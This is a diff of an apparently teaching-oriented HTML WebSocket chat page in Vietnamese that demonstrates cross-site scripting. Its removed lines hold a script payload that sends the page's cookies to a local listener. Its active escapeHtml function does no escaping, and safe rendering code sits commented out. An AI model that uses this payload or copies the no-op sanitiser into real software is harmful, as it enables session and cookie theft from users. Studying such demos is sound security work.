@@ -63,20 +63,33 @@
 
     <textarea id="input" placeholder="Nhập tin nhắn..."></textarea><br />
     <button id="send">Gửi</button>
-    <div>
-        <p>
-        <pre><code>&lt;script&gt;window.location='http://127.0.0.1:5500/phai_chiu_page.html?cookie='+document.cookie;&lt;/script&gt;</code></pre>
-        </p>
-        <p>
-        <pre><code>&lt;script&gt;alert("Xin chào! Đây là thông báo bằng alert.");&lt;/script&gt;</code></pre>
-        </p>
-    </div>
+
+    <!-- <button id="checkCookies">Kiểm tra cookie</button>
+    <pre id="cookieOutput"
+        style="background:#fff;padding:8px;border:1px solid #ddd;border-radius:6px;white-space:pre-wrap;"></pre> -->
 
 
     <script>
+        document.cookie = "hello; max-age=86400; path=/; SameSite=Strict";
+
+        // document.getElementById('checkCookies').addEventListener('click', () => {
+        //     // Lấy cookie (chỉ những cookie client có thể đọc được)
+        //     const cookies = document.cookie || '(Không có cookie có thể đọc bằng JS)';
+        //     // Hiển thị an toàn (text, không render HTML)
+        //     document.getElementById('cookieOutput').textContent = cookies;
+        // });
         function escapeHtml(s) {
             return String(s)
         }
+
+        // function escapeHtml(str) {
+        //     return String(str)
+        //         .replace(/&/g, "&amp;")
+        //         .replace(/</g, "&lt;")
+        //         .replace(/>/g, "&gt;")
+        //         .replace(/"/g, "&quot;")
+        //         .replace(/'/g, "&#39;");
+        // }
         const ws = new WebSocket("ws://localhost:8080");
         const userEl = document.getElementById("user");
         const inputEl = document.getElementById("input");
@@ -107,19 +120,39 @@
             chatEl.appendChild(div);
             chatEl.scrollTop = chatEl.scrollHeight;
 
-            // Thực thi script trong message nếu có
-            const scripts = div.querySelectorAll('script');
-            scripts.forEach(oldScript => {
-                const newScript = document.createElement('script');
-                // Copy thuộc tính
-                for (const attr of oldScript.attributes) {
-                    newScript.setAttribute(attr.name, attr.value);
-                }
-                newScript.textContent = oldScript.textContent;
-                oldScript.parentNode.replaceChild(newScript, oldScript);
-            });
+            // const scripts = div.querySelectorAll('script');
+            // scripts.forEach(oldScript => {
+            //     const newScript = document.createElement('script');
+            //     // Copy thuộc tính
+            //     for (const attr of oldScript.attributes) {
+            //         newScript.setAttribute(attr.name, attr.value);
+            //     }
+            //     newScript.textContent = oldScript.textContent;
+            //     oldScript.parentNode.replaceChild(newScript, oldScript);
+            // });
         }
+        // function renderMessage({ user, text, ts }) {
+        //     const time = new Date(ts || Date.now()).toLocaleTimeString();
+        //     const div = document.createElement("div");
+        //     div.className = "msg";
+
+        //     const meta = document.createElement("div");
+        //     meta.className = "meta";
+        //     meta.textContent = `${user} — ${time}`;
+
+        //     const body = document.createElement("div");
+        //     body.textContent = text; // <- không phải innerHTML
+
+        //     div.appendChild(meta);
+        //     div.appendChild(body);
+
+        //     chatEl.appendChild(div);
+        //     chatEl.scrollTop = chatEl.scrollHeight;
+        // }
     </script>
+   
+
+
 </body>
 
 </html>
